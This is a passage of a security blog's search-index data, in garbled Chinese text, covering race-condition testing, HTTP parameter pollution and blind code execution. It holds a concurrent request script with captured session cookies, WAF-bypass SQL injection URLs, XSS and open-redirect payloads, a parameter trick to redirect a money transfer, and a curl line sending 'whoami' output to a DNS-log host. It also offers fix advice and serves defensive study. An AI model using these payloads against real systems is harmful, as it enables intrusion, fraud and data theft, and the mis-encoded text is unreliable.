æœªå®Œç»“ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚","categories":[{"name":"WEBå®‰å…¨","slug":"WEBå®‰å…¨","permalink":"http://www.vkxss.top/categories/WEBå®‰å…¨/"}],"tags":[{"name":"WEBæ¸—é€æµ‹è¯•","slug":"WEBæ¸—é€æµ‹è¯•","permalink":"http://www.vkxss.top/tags/WEBæ¸—é€æµ‹è¯•/"}]},{"title":"Pythonå¤šçº¿ç¨‹æµ‹è¯•å¹¶å‘æ¼æ´æµ‹è¯•","slug":"Python-å¤šçº¿ç¨‹æµ‹è¯•å¹¶å‘æ¼æ´æµ‹è¯•","date":"2019-11-13T07:30:08.000Z","updated":"2019-11-15T09:10:27.215Z","comments":true,"path":"2019/11/13/Python-å¤šçº¿ç¨‹æµ‹è¯•å¹¶å‘æ¼æ´æµ‹è¯•/","link":"","permalink":"http://www.vkxss.top/2019/11/13/Python-å¤šçº¿ç¨‹æµ‹è¯•å¹¶å‘æ¼æ´æµ‹è¯•/","excerpt":"","text":"Pythonå¤šçº¿ç¨‹æµ‹è¯•å¹¶å‘æ¼æ´æµ‹è¯• æ­¥éª¤è®°å½• Pythonå¤šçº¿ç¨‹æµ‹è¯•å¹¶å‘æ¼æ´æµ‹è¯• æˆ‘ä»¬åœ¨ä½¿ç”¨é»‘ç›’ï¼Œä¾‹å¦‚æµ‹è¯•ä¸€äº›æ”¯ä»˜ã€å…‘æ¢ç±»çš„åŠŸèƒ½æ—¶ï¼Œéƒ½éœ€è¦è¿›è¡Œå¤šçº¿ç¨‹å¹¶å‘æµ‹è¯•ï¼Œæ¥ç¡®ä¿æµ‹è¯•çš„åº”ç”¨åœ¨ä»£ç æˆ–è€…æ•°æ®åº“å±‚æ˜¯å¦åŠ é”ã€‚ æ­¥éª¤è®°å½• Burp Suiteå®‰è£…æ’ä»¶ï¼Œæ–¹ä¾¿ç”Ÿæˆpythonå‘åŒ…ä»£ç  æ‹¦æˆªåŒ…å¹¶ç”Ÿæˆä»£ç ,å¹¶æ‰“å¼€ä¸€ä¸ªæ–‡æœ¬ç¼–è¾‘å™¨ï¼Œå³é”®ç²˜è´´å‡ºæ¥ï¼š è¿è¡ŒPythonå¤šçº¿ç¨‹ä»£ç  å°†ç”Ÿæˆçš„pythonä»£ç ç²˜è´´åˆ°action()å‡½æ•°é‡Œé¢å³å¯ï¼› 12345678910111213141516171819202122import threadingimport requeststhreads = []def action(): burp0_url = &quot;https://www.baidu.com:443/s?ie=utf-8&amp;f=8&amp;rsv_bp=1&amp;rsv_idx=1&amp;tn=baidu&amp;wd=1&quot; burp0_cookies = &#123;&quot;BAIDUID&quot;: &quot;E316F3DB8A100CF49C7840194D685130:FG=1&quot;, &quot;BIDUPSID&quot;: &quot;E316F3DB8A100CF4365A4179630696D4&quot;, &quot;PSTM&quot;: &quot;1571902876&quot;, &quot;BD_UPN&quot;: &quot;133252&quot;, &quot;H_PS_PSSID&quot;: &quot;1434_21105_29568_29220_22160&quot;, &quot;BDORZ&quot;: &quot;B490B5EBF6F3CD402E515D22BCDA1598&quot;, &quot;delPer&quot;: &quot;0&quot;, &quot;BD_CK_SAM&quot;: &quot;1&quot;, &quot;PSINO&quot;: &quot;2&quot;, &quot;BD_HOME&quot;: &quot;0&quot;, &quot;H_PS_645EC&quot;: &quot;6d50bLk7EAzhqdJENzPoKrR6B%2FRN9gavPDwdfFeqclmRNgzaMlT7KBxZaRg&quot;, &quot;COOKIE_SESSION&quot;: &quot;292444_5_6_2_4_26_0_2_2_5_0_0_243247_0_0_0_1573179527_1572936381_1573657905%7C6%23221_3_1572936369%7C2&quot;, &quot;BDSVRTM&quot;: &quot;130&quot;&#125; burp0_headers = &#123;&quot;User-Agent&quot;: &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:69.0) Gecko/20100101 Firefox/69.0&quot;, &quot;Accept&quot;: &quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;, &quot;Connection&quot;: &quot;close&quot;, &quot;Upgrade-Insecure-Requests&quot;: &quot;1&quot;&#125; res=requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies) # print(res.status_code)if __name__ == &apos;__main__&apos;: print(&quot;threading start!&quot;) for i in range(50): t = threading.Thread(target=action) t.start() print(&quot;threading end!&quot;) ç¡®è®¤ç»“æœå³å¯","categories":[{"name":"Python","slug":"Python","permalink":"http://www.vkxss.top/categories/Python/"}],"tags":[{"name":"WEBæ¸—é€æµ‹è¯•","slug":"WEBæ¸—é€æµ‹è¯•","permalink":"http://www.vkxss.top/tags/WEBæ¸—é€æµ‹è¯•/"}]},{"title":"æ¡ä»¶ç«äº‰æ¼æ´æ€»ç»“","slug":"æ¸—é€æµ‹è¯•-æ¡ä»¶ç«äº‰æ¼æ´æ€»ç»“","date":"2019-11-12T07:30:08.000Z","updated":"2019-11-13T15:35:02.401Z","comments":true,"path":"2019/11/12/æ¸—é€æµ‹è¯•-æ¡ä»¶ç«äº‰æ¼æ´æ€»ç»“/","link":"","permalink":"http://www.vkxss.top/2019/11/12/æ¸—é€æµ‹è¯•-æ¡ä»¶ç«äº‰æ¼æ´æ€»ç»“/","excerpt":"","text":"0x00 æ¡ä»¶ç«äº‰æ¼æ´ä»‹ç» 0x01 æ¼æ´æŒ–æ˜ 0x02 æµ‹è¯•æµç¨‹ 0x03 æ¼æ´æ¡ˆä¾‹ 0x04 æµ‹è¯•æŠ€å·§ ä½¿ç”¨Burpæ¨¡å—-Inturder ä¿®å¤å»ºè®® æ¼æ´é˜²å¾¡ 0x00 æ¡ä»¶ç«äº‰æ¼æ´ä»‹ç» ç«äº‰æ¡ä»¶æ¼æ´å°±æ˜¯å¤šä¸ªè¿›ç¨‹è®¿é—®åŒä¸€èµ„æºæ—¶äº§ç”Ÿçš„æ—¶é—´æˆ–è€…åºåˆ—çš„å†²çªï¼Œå¹¶åˆ©ç”¨è¿™ä¸ªå†²çªæ¥å¯¹ç³»ç»Ÿè¿›è¡Œæ”»å‡»ã€‚ä¸€ä¸ªçœ‹èµ·æ¥æ— å®³çš„ç¨‹åºå¦‚æœè¢«æ¶æ„æ”»å‡»è€…åˆ©ç”¨ï¼Œå°†å‘ç”Ÿç«äº‰æ¡ä»¶æ¼æ´ã€‚ 0x01 æ¼æ´æŒ–æ˜ ä¸€èˆ¬æŒ–æ˜çš„ç‚¹ï¼š ç­¾åˆ° æ”¯ä»˜ ç§¯åˆ†å…‘æ¢ è½¬è´¦ ä¼˜æƒ åˆ¸ æç° æ–‡ä»¶ä¸Šä¼  ç»•è¿‡æ•°é‡é™åˆ¶ ç­‰ã€‚ã€‚ 0x02 æµ‹è¯•æµç¨‹ åŸºæœ¬æ–¹æ³•å°±æ˜¯ï¼Œä¾‹å¦‚åœ¨æäº¤è®¢å•çš„æ—¶å€™ï¼ŒæŠ“å–åŒ…ï¼Œç„¶åæ„é€ è„šæœ¬ï¼Œè¿›è¡Œå¤šçº¿ç¨‹å¹¶å‘æ“ä½œã€‚ 0x03 æ¼æ´æ¡ˆä¾‹ åˆ©ç”¨ç«äº‰æ¡ä»¶å®ç°RCE https://www.freebuf.com/column/215340.html åˆ©ç”¨ç«äº‰æ¡ä»¶å®ç°ææƒ https://www.jianshu.com/p/7a50d424adb1 0x04 æµ‹è¯•æŠ€å·§ä½¿ç”¨Burpæ¨¡å—-Inturderé€‰æ‹©Payloadç±»å‹ä¸ºç©ºï¼Œå°†çº¿ç¨‹è°ƒåˆ°50è¿›è¡Œå¤šçº¿ç¨‹å¼‚æ­¥å‘åŒ… ä¿®å¤å»ºè®® è§£å†³æ–¹æ¡ˆé€šå¸¸æ˜¯åŠ â€œé”â€ï¼Œmysqlæ‰§è¡Œäº‹åŠ¡å‰åŠ BEGINï¼ŒååŠ COMMITï¼Œä»è€Œé”å®šä¸€æ¬¡äº‹åŠ¡å¤„ç†ï¼Œä½¿æŒ‰åºè¿›è¡Œï¼š æ¼æ´é˜²å¾¡ å¯¹äºä¸šåŠ¡ç«¯æ¡ä»¶ç«äº‰çš„é˜²èŒƒï¼Œä¸€èˆ¬çš„æ–¹æ³•æ˜¯è®¾ç½®é”ï¼› å¯¹äºæ–‡ä»¶ä¸Šä¼ ï¼Œä¸€å®šè¦ç»è¿‡å……åˆ†å®Œæ•´çš„æ£€æŸ¥ä¹‹åå†ä¸Šä¼ ï¼› åœ¨æ“ä½œç³»ç»Ÿçš„è§’åº¦ï¼Œå…±äº«æ•°æ®è¦è¿›è¡Œä¸Šé”ä¿æŠ¤ã€‚","categories":[{"name":"WEBå®‰å…¨","slug":"WEBå®‰å…¨","permalink":"http://www.vkxss.top/categories/WEBå®‰å…¨/"}],"tags":[{"name":"WEBæ¸—é€æµ‹è¯•","slug":"WEBæ¸—é€æµ‹è¯•","permalink":"http://www.vkxss.top/tags/WEBæ¸—é€æµ‹è¯•/"}]},{"title":"å‚æ•°æ±¡æŸ“æ¼æ´ï¼ˆHPPï¼‰æŒ–æ˜æŠ€å·§","slug":"æ¸—é€æµ‹è¯•-å‚æ•°æ±¡æŸ“æ¼æ´ï¼ˆHPPï¼‰æŒ–æ˜æŠ€å·§","date":"2019-11-09T07:30:08.000Z","updated":"2019-11-10T14:44:59.594Z","comments":true,"path":"2019/11/09/æ¸—é€æµ‹è¯•-å‚æ•°æ±¡æŸ“æ¼æ´ï¼ˆHPPï¼‰æŒ–æ˜æŠ€å·§/","link":"","permalink":"http://www.vkxss.top/2019/11/09/æ¸—é€æµ‹è¯•-å‚æ•°æ±¡æŸ“æ¼æ´ï¼ˆHPPï¼‰æŒ–æ˜æŠ€å·§/","excerpt":"","text":"å‚æ•°æ±¡æŸ“æ¼æ´ï¼ˆHPPï¼‰æŒ–æ˜æŠ€å·§è®°å½• æ¦‚å¿µï¼š æ¼æ´åŸç†ï¼š å®æˆ˜æ¡ˆä¾‹æ€»ç»“ï¼š æŒ–æ˜æŠ€å·§ï¼š ä¿®å¤æ–¹æ¡ˆï¼š å‚æ•°æ±¡æŸ“æ¼æ´ï¼ˆHPPï¼‰æŒ–æ˜æŠ€å·§è®°å½•æ¦‚å¿µï¼šHTTPå‚æ•°æ±¡æŸ“ï¼Œä¹Ÿå«HPPï¼ˆHTTP Parameter Pollutionï¼‰ã€‚ç®€å•åœ°è®²å°±æ˜¯ç»™ä¸€ä¸ªå‚æ•°èµ‹ä¸Šä¸¤ä¸ªæˆ–ä¸¤ä¸ªä»¥ä¸Šçš„å€¼ï¼Œç”±äºç°è¡Œçš„HTTPæ ‡å‡†æ²¡æœ‰æåŠåœ¨é‡åˆ°å¤šä¸ªè¾“å…¥å€¼ç»™ç›¸åŒçš„å‚æ•°èµ‹å€¼æ—¶åº”è¯¥æ€æ ·å¤„ç†ï¼Œè€Œä¸”ä¸åŒçš„ç½‘ç«™åç«¯åšå‡ºçš„å¤„ç†æ–¹å¼æ˜¯ä¸åŒçš„ï¼Œä»è€Œé€ æˆè§£æé”™è¯¯ã€‚ æ¼æ´åŸç†ï¼š é€šè¿‡ç®€å•çš„æ¡ˆä¾‹å¯ä»¥è¯´æ˜è¿™ç§å¤„ç†çš„å·®å¼‚ï¼š åœ¨ä¸åŒçš„æœç´¢å¼•æ“ä¸­è¿›è¡Œæœç´¢ï¼Œåœ¨åœ°å€æ è¾“å…¥URLï¼š/s?wd=test&amp;wd=test1ï¼Œè¿™é‡Œé‡å¤ç›¸åŒæœç´¢å‚æ•°ï¼Œè§‚å¯Ÿæœç´¢ç»“æœçš„ä¸åŒï¼š (1)ç™¾åº¦æ¥å—ç¬¬ä¸€ä¸ªå‚æ•°ï¼ˆtestï¼‰è€Œæ”¾å¼ƒç¬¬äºŒä¸ªå‚æ•°ï¼ˆtest1ï¼‰ï¼š (2)Yahhoæ¥å—ç¬¬äºŒä¸ªå‚æ•°ï¼ˆtest1ï¼‰è€Œæ”¾å¼ƒç¬¬ä¸€ä¸ªå‚æ•°ï¼ˆtestï¼‰ï¼š (3)Googleä¼šå°†ä¸¤ä¸ªå€¼éƒ½æ¥å—ï¼Œå¹¶é€šè¿‡ä¸€ä¸ªç©ºæ ¼å°†ä¸¤ä¸ªå‚æ•°è¿æ¥èµ·æ¥ï¼Œç»„æˆä¸€ä¸ªå‚æ•°ï¼š æµ‹è¯•ä¸åŒæœåŠ¡å™¨å¯¹æ¼æ´çš„å¤„ç†æ–¹æ³•ï¼š å¯¹äºFlaskæœåŠ¡å™¨ï¼Œå–ç¬¬ä¸€ä¸ªå€¼ å¯¹äºPHP/ApacheæœåŠ¡å™¨ï¼Œå–æœ€åä¸€ä¸ªå€¼æˆ‘ä»¬ä»¥å¼¹çª—ä¸ºä¾‹ï¼Œé¦–å…ˆå°†jsä»£ç æ”¾åœ¨firstå‚æ•°nameä½ç½®ï¼Œè¿”å›string(3) â€œ222â€ ï¼Œè¯æ˜å–çš„æ˜¯æœ€åä¸€ä¸ªnameå‚æ•°çš„å€¼ã€‚ å…·ä½“æœåŠ¡ç«¯å¯¹åº”çš„ä¸åŒå¤„ç†æ–¹å¼å¦‚ä¸‹ å®æˆ˜æ¡ˆä¾‹æ€»ç»“ï¼š HPPæ¼æ´çš„äº§ç”ŸåŸå› ä¸€æ–¹é¢æ¥è‡ªæœåŠ¡å™¨å¤„ç†æœºåˆ¶çš„ä¸åŒï¼Œå¦ä¸€æ–¹é¢æ¥è‡ªå¼€å‘äººå‘˜åç«¯æ£€æµ‹é€»è¾‘çš„é—®é¢˜ã€‚HTTP å‚æ•°æ±¡æŸ“çš„é£é™©å®é™…ä¸Šå–å†³äºåç«¯æ‰€æ‰§è¡Œçš„æ“ä½œï¼Œä»¥åŠè¢«æ±¡æŸ“çš„å‚æ•°æäº¤åˆ°äº†å“ªé‡Œã€‚æ€»ä½“ä¸ŠHPPä¸€èˆ¬æœ‰ä¸¤ç§åˆ©ç”¨åœºæ™¯ï¼š 1ï¼‰é€»è¾‘æ¼æ´ï¼Œé€šå¸¸ä¼šé€ æˆIDORï¼Œä¿¡æ¯æ³„éœ²ï¼Œè¶Šæƒç­‰æ¼æ´; 2ï¼‰ä½œä¸ºå…¶ä»–æ¼æ´çš„è¾…åŠ©ï¼Œç”¨äºç»•è¿‡æ¼æ´çš„æ£€æµ‹å’ŒWafç­‰ã€‚ è¿™é‡Œæ±‡æ€»äº†å·¥ä½œä¸­å’Œå›½å†…å¤–é‡åˆ°çš„ä¸€äº›å…¸å‹æ¡ˆä¾‹ï¼š 1ã€ é€»è¾‘æ¼æ´ï¼ˆIDORï¼‰ 1ï¼‰æ•æ„Ÿæ“ä½œ SilverlightFoxä¸­ï¼Œç½‘ç«™é€šè¿‡URLï¼šhttps://www.example.com/transferMoney.php?amount=1000&amp;fromAccount=12345è¿›è¡Œè½¬è´¦æ“ä½œï¼ŒåŸæœ¬é“¾æ¥ä¸­æ˜¯æ²¡æœ‰toAmountå‚æ•°çš„ï¼Œè¿™ä¸ªå‚æ•°æ˜¯åç«¯å›ºå®šçš„ï¼Œä½†å¦‚æœæˆ‘ä»¬é‡å¤æäº¤è¿™ä¸ªå‚æ•°ï¼štoAccount=9876&amp;amount=1000&amp;fromAccount=12345&amp;toAccount=99999ç¬¬äºŒä¸ª toAccount å‚æ•°ï¼Œä¼šè¦†ç›–åç«¯è¯·æ±‚ï¼Œå¹¶å°†é’±è½¬è´¦ç»™æ¶æ„è´¦æˆ·ï¼ˆ 99999 ï¼‰è€Œä¸æ˜¯ç”±ç³»ç»Ÿè®¾ç½®çš„é¢„æœŸè´¦æˆ·ï¼ˆ 9876 ï¼‰ã€‚ (2ï¼‰IDORï¼ˆä¸å®‰å…¨çš„å¯¹è±¡å¼•ç”¨ï¼‰ ä¸€èˆ¬çš„ç¤¾äº¤è½¯ä»¶éƒ½æœ‰â€œå…³æ³¨â€æˆ–â€å–œæ¬¢â€åŠŸèƒ½ï¼Œä¸‹é¢å°±æ˜¯IDä¸º5318415å¯¹5333003è¿›è¡Œå…³æ³¨å‘é€çš„æ•°æ®åŒ…ï¼š æŒ‰æˆ‘ä»¬é€šå¸¸æŒ–æ˜é€»è¾‘æ¼æ´çš„æ€è·¯ï¼Œæˆ‘ä»¬å¯ä»¥ç¯¡æ”¹IDå€¼ï¼Œä½¿å¯¹æ–¹å…³æ³¨æˆ‘ã€‚è¿™é‡Œ5318415æ˜¯æˆ‘çš„IDï¼Œä½†å°†æˆ‘çš„actorIdæ›¿æ¢ä¸ºå¯¹æ–¹çš„IDï¼Œä¼šæ”¶åˆ°â€œ401 Unauthorizedâ€é”™è¯¯ï¼Œè¯´æ˜æ­¤å¤„åšäº†é‰´æƒæ“ä½œã€‚ ä½†æ˜¯ï¼Œå¦‚æœè¯·æ±‚2ä¸ªactorIdå‚æ•°ï¼Œç¬¬ä¸€ä¸ªactorIdå‚æ•°æ˜¯ç›®æ ‡çš„actorIdã€‚è¿™æ ·5024700ï¼ˆå—å®³è€…ï¼‰ä¼šå…³æ³¨5318415ï¼ˆæˆ‘ï¼‰ã€‚è¿™æ¬¡å¾—åˆ°çš„å“åº”æ˜¯202 Acceptedã€‚ åå°å¯¹äºactorIdçš„é‰´æƒæ“ä½œæ˜¯å¯¹ç¬¬äºŒä¸ªï¼Œå…³æ³¨æ“ä½œå–çš„å´æ˜¯ç¬¬ä¸€ä¸ªã€‚æ‰€ä»¥åœ¨æµ‹è¯•è¶Šæƒç±»é—®é¢˜æ—¶æœªæœä¸å¦¨å¤šè¯•ä¸€æ­¥HPPï¼Œä¸‹é¢Twitteræ¡ˆä¾‹ä¹Ÿæ˜¯å¦‚å‡ºä¸€è¾™ï¼šhttps://twitter.com/i/u?iid=F6542&amp;uid=2321301342&amp;uid=1134885524&amp;nid=22+26 é€šè¿‡æ·»åŠ ç¬¬äºŒä¸ªuidï¼Œå–æ¶ˆTwitterçš„é‚®ç®±æé†’ã€‚ 3ï¼‰ç¤¾äº¤åˆ†äº«é“¾æ¥ ä¸å°‘ç½‘ç«™éƒ½æœ‰ç¤¾äº¤åˆ†äº«æŒ‰é’®ï¼Œå¯ä»¥æŠŠå†…å®¹åˆ†äº«åˆ°å…¶ä»–ç¤¾äº¤åª’ä½“ï¼Œå¦‚Hackeroneçš„é“¾æ¥ä¸ºï¼šhttps://hackerone.com/blog/introducing-signalï¼Œåˆ†äº«åˆ°FBä¸Šé“¾æ¥ä¸ºï¼š https://www.facebook.com/sharer.php?u=https://hackerone.com/blog/introducing-signal å¦‚æœæˆ‘ä»¬å°†è¦åˆ†äº«çš„Hackeroneçš„é“¾æ¥æ”¹ä¸ºï¼šhttps://hackerone.com/blog/introducing-signal?&amp;u=https://vk.com/durovï¼Œåˆ™æœ€ç»ˆçš„è·³è½¬ä¼šæˆä¸ºï¼š https://www.facebook.com/sharer.php?u=https://hackerone.com/blog/introducing-signal?&amp;u=https://vk.com/durov åä¸€ä¸ªå‚æ•°uæ‹¥æœ‰æ¯”ç¬¬ä¸€ä¸ªæ›´é«˜çš„ä¼˜å…ˆçº§ï¼Œä¹‹åä¼šç”¨äº Fackbook çš„å‘å¸ƒï¼Œæœ€ç»ˆä¼šè·³è½¬åˆ°æ¶æ„ç«™ç‚¹https://vk.com/durovã€‚ 4ï¼‰é¡µé¢è·³è½¬ ä¸€ä¸ªDigitsè·³è½¬çš„æ¡ˆä¾‹ï¼Œè·³è½¬é“¾æ¥å¦‚ä¸‹ï¼š https://www.digits.com/login?consumer_key=xx&amp;host=https://www.peiscope.tv å¦‚æœç›´æ¥ä¿®æ”¹å‚æ•°ä¸ºhttp://attacker.comï¼Œç”±äºæ³¨å†ŒåŸŸä¸åŒ¹é…ï¼Œå› æ­¤é¡µé¢å°†æ˜¾ç¤ºé”™è¯¯ï¼Œä½†å¦‚æœæˆ‘ä»¬ä½¿ç”¨HPPï¼š https://www.digits.com/login?consumer_key=xx&amp;host=https://www.peiscope.tv&amp;host=http://attacker.com ä»è€Œç¬¬ä¸€ä¸ªhostå‚æ•°ç»•è¿‡éªŒè¯ï¼Œå–ç¬¬äºŒä¸ªhostå‚æ•°ä½œä¸ºè·³è½¬æºã€‚ 5ï¼‰æƒé™æ“ä½œ ä»¥ä¸‹ä»£ç ï¼š &lt;? $val=htmlspecialchars($_GET[&#39;par&#39;],ENT_QUOTES); ?&gt; 1234567- ä»¥ä¸‹ä»£ç ä½¿ç”¨parå‚æ•°å–ç”¨æˆ·è¾“å…¥å¹¶ç”ŸæˆURLï¼š- http://host/page.php?action=view&amp;par=123- ä½†ç”¨æˆ·è‹¥è¾“å…¥parä¸ºåˆ™æœ€ç»ˆç”Ÿæˆçš„é“¾æ¥ä¸ºï¼š123&amp;amp;action=editï¼Œåˆ™æœ€ç»ˆçš„è¯·æ±‚åˆ™å˜æˆï¼š- http://host/page.php?action=view&amp;par=123&amp;amp;action=edit- é€šè¿‡é‡å¤æäº¤actionå‚æ•°ï¼Œä¼šå¯¼è‡´åº”ç”¨æ¥å—ç¼–è¾‘æ“ä½œè€Œä¸æ˜¯æŸ¥çœ‹æ“ä½œï¼Œå®ç°æƒé™çš„æå‡ã€‚- æ³¨ï¼š&apos;&amp;amp;&apos; = &apos;&amp;&apos; ï¼Œåœ¨HTMLä¸­çš„&amp;ç”¨&amp;amp; æ¥è¡¨ç¤º 2ã€ ç»•è¿‡æ£€æµ‹ï¼ˆWAFï¼‰ 1ï¼‰SQLç»•è¿‡1 12345- ä¸€ä¸ªå¸¸è§çš„SQLæ³¨å…¥payloadå¦‚:- http://xxx/horse.php?id=7 union select 1,2,3ï¼Œcurrent_user- æ¢æµ‹å‘ç°ç½‘ç«™é…ç½®äº†WAFæ¥é˜»æ­¢ä»»æ„åŒ…å«â€œselectâ€æˆ–â€œunionâ€ç­‰å¸¸ç”¨çš„SQLæŸ¥è¯¢å…³é”®å­—ï¼Œé€šè¿‡HPPç»•è¿‡ï¼š- http://xxx/horse.php?id=0&amp;amp;id=7%20union%20select%201,2,3,current_user- æ³¨å…¥è¯­å¥è¢«å†™åˆ°ç¬¬äºŒä¸ªå‚æ•°å€¼çš„ä½ç½®ï¼Œä¸ä¼šè¢«wafè§£æã€‚ 2ï¼‰SQLç»•è¿‡2 ModSecurityè¿‡æ»¤å™¨ä¼šå°†ç±»ä¼¼äºselect1,2,3 from tableè¿™ç±»çš„è¯­å¥å½’ç±»ä¸ºé»‘åå•ã€‚ä½†æ˜¯è¿™ä¸ªwebæœåŠ¡å™¨åœ¨é‡åˆ°ä¸ºåŒä¸€ä¸ªå‚æ•°èµ‹å€¼ä¸åŒæ•°å€¼æ—¶ï¼Œä¼šé‡‡å–ç±»ä¼¼è°·æ­Œçš„å¤„ç†æ–¹å¼ï¼Œå°†å‚æ•°è¿æ¥èµ·æ¥ï¼Œä»¥æ­¤æ¥ç»•è¿‡é»‘åå•ã€‚ä¾‹å¦‚æäº¤å¦‚ä¸‹çš„URLï¼š http://xxx/index.aspx?page=select 1&amp;page=2,3 from table 3ï¼‰Apple Cupsçš„XSS Apple Cupsæ˜¯è¢«è®¸å¤šUNIXç³»ç»Ÿåˆ©ç”¨çš„æ‰“å°ç³»ç»Ÿã€‚ç³»ç»Ÿå¯¹kerberosè¿›è¡Œäº†é»‘åå•è¿‡æ»¤ï¼Œé€šè¿‡å‰ç½®ä¸€ä¸ªé‡å¤å‚æ•°å¯ä»¥è§¦å‘xssï¼š http://xxx/?kerberos=onmouseover=alert(1)&amp;kerberos= è¿™ä¸ªæ–¹æ³•å¯ä»¥ç»•è¿‡ç³»ç»Ÿçš„éªŒè¯æœºåˆ¶ï¼ŒåŸå› æ˜¯è¿™ä¸ªéªŒè¯ç³»ç»Ÿåªé‡‡çº³äº†ç¬¬äºŒä¸ªkerberosçš„å€¼ï¼Œè¿™ä¸ªå€¼ä¸ºç©ºï¼Œå› æ­¤ä¸ä¼šè§¦å‘ã€‚è€Œç¬¬ä¸€ä¸ªkerberosç›´åˆ°è¢«ç”¨äºæ„å»ºåŠ¨æ€HTMLå†…å®¹å‰éƒ½æ²¡æœ‰è¢«éªŒè¯ã€‚æœ€ç»ˆåœ¨webç«™ç‚¹çš„ä¸Šä¸‹æ–‡ä¸­javascriptè¯­å¥è¢«æ‰§è¡Œã€‚ 4ï¼‰URLé‡å®šå‘+HPP+XSS åœ¨ç‚¹å‡»ç½‘ç«™çš„é“¾æ¥æ—¶ï¼Œä¼šå°†ç”¨æˆ·é‡å®šå‘åˆ°ä¸€ä¸ªé¡µé¢ï¼Œé“¾æ¥ä¸ºï¼š xxx.aspx?dest=http://whitelistedWebsite.com è¿™å®¹æ˜“æƒ³åˆ°URLé‡å®šå‘æ¼æ´ï¼Œç»è¿‡æ¢æµ‹ï¼Œå‘ç°destå‚æ•°æ¥å—çš„åè®®æœ‰http:// ftp:// http:/ javascript:/ï¼Œæ‰€ä»¥å°è¯•æ„é€ xssï¼š dest=javascript://alert(document.domain) å‘ç°å­˜åœ¨ç™½åå•é™åˆ¶ï¼Œå°è¯•ç»•è¿‡ï¼š dest=javascript:/whitelistedWebsite.com/i;alert(document.domain ä½†åˆ†å·ï¼›ä¼šæ— æ³•è§£æï¼Œå¯¼è‡´æŠ¥é”™ï¼Œæœ€ç»ˆä½¿ç”¨HPPç»•è¿‡ï¼š dest=javascript:/whitelistedWebsite.com/i&amp;dest=alert(1) åŸç†å’Œä¾‹1ç±»ä¼¼ï¼Œæ¥å—ä¸¤ä¸ªå‚æ•°å€¼è¿›è¡Œæ‹¼æ¥ï¼šjavascript://alert(1) æŒ–æ˜æŠ€å·§ï¼š æ ¹æ®ä¸Šé¢çš„å®æˆ˜æ¡ˆä¾‹æ€»ç»“ï¼Œåœ¨æŒ–æ˜HPPæ¼æ´çš„æ—¶å€™ï¼Œéœ€è¦æ³¨æ„ä»¥ä¸‹å‡ ç‚¹ï¼š 1ã€å’ŒIDORæ¼æ´æŒ–æ˜ç±»ä¼¼ï¼Œå…³æ³¨ä¸ç”¨æˆ·æƒé™ç´§å¯†ç›¸å…³çš„å‚æ•°ï¼Œæœ‰äº›åœºæ™¯å¯èƒ½é˜²èŒƒäº†IDORï¼Œä½†é‡å¤æäº¤å‚æ•°å¯èƒ½å°±ä¼šäº§ç”Ÿå¥‡æ•ˆï¼› 2ã€åœ¨æŒ–æ˜å…¶ä»–æ¼æ´çš„æ—¶å€™ï¼Œå¦‚æœè¿›è¡Œäº†æ£€æµ‹åˆæ— æ³•ç»•è¿‡çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥å°è¯•é€šè¿‡é‡å¤æäº¤å‚æ•°/å‚æ•°æ‹¼æ¥æ–¹å¼ç»•è¿‡æ£€æµ‹ã€‚ ä¿®å¤æ–¹æ¡ˆï¼š æ¦‚æ‹¬åœ°è®²ï¼Œé˜²èŒƒè¿™ç±»æ”»å‡»çš„æ–¹æ³•æœ‰ä¸¤ç§ï¼š 1ã€è®¾å¤‡å±‚é¢ï¼Œè®©WAFæˆ–å…¶ä»–ç½‘å…³è®¾å¤‡ï¼ˆæ¯”å¦‚IPSï¼‰åœ¨æ£€æŸ¥URLæ—¶ï¼Œå¯¹åŒä¸€ä¸ªå‚æ•°è¢«å¤šæ¬¡èµ‹å€¼çš„æƒ…å†µè¿›è¡Œç‰¹æ®Šå¤„ç†ã€‚ç”±äºHTTPåè®®å…è®¸ç›¸åŒå‚æ•°åœ¨URLä¸­å¤šæ¬¡å‡ºç°ï¼Œå› æ­¤è¿™ç§ç‰¹æ®Šå¤„ç†éœ€è¦æ³¨æ„é¿å…è¯¯æ€çš„æƒ…å†µï¼› 2ã€ä»£ç å±‚é¢ï¼Œç¼–å†™WEBç¨‹åºæ—¶ï¼Œè¦é€šè¿‡åˆç†çš„$_GETæ–¹æ³•è·å–URLä¸­çš„å‚æ•°å€¼ï¼Œè€Œå°è¯•è·å–webæœåŠ¡å™¨è¿”å›ç»™ç¨‹åºçš„å…¶ä»–å€¼æ—¶è¦æ…é‡å¤„ç†ï¼Œç»“åˆå…¶ä»–æ¼æ´çš„äº§ç”Ÿè¿›è¡Œç»„åˆæ’æŸ¥ã€‚","categories":[{"name":"WEBå®‰å…¨","slug":"WEBå®‰å…¨","permalink":"http://www.vkxss.top/categories/WEBå®‰å…¨/"}],"tags":[{"name":"WEBæ¸—é€æµ‹è¯•","slug":"WEBæ¸—é€æµ‹è¯•","permalink":"http://www.vkxss.top/tags/WEBæ¸—é€æµ‹è¯•/"}]},{"title":"æ— å›æ˜¾ä»£ç æ‰§è¡Œåˆ©ç”¨æ–¹æ³•æ€»ç»“","slug":"æ¸—é€æµ‹è¯•-æ— å›æ˜¾ä»£ç æ‰§è¡Œåˆ©ç”¨æ–¹æ³•æ€»ç»“","date":"2019-11-08T07:30:08.000Z","updated":"2019-11-10T04:54:57.610Z","comments":true,"path":"2019/11/08/æ¸—é€æµ‹è¯•-æ— å›æ˜¾ä»£ç æ‰§è¡Œåˆ©ç”¨æ–¹æ³•æ€»ç»“/","link":"","permalink":"http://www.vkxss.top/2019/11/08/æ¸—é€æµ‹è¯•-æ— å›æ˜¾ä»£ç æ‰§è¡Œåˆ©ç”¨æ–¹æ³•æ€»ç»“/","excerpt":"","text":"0X00 DNSLOGå›æ˜¾ 0X01 curlä¸Šä¼ æ–‡ä»¶ 0X02 Wget 0X03 åå¼¹shell 0X00 DNSLOGå›æ˜¾ å°è¯•DNSLOGè·å–å›æ˜¾ä½¿ç”¨åå¼•å·æ‰§è¡Œä»£ç ï¼Œå¹¶ç”¨curlå°†æ‰§è¡Œç»“æœè¿”å›ç»™DNSLOG 12curl http://dnslog/`whoami`ping 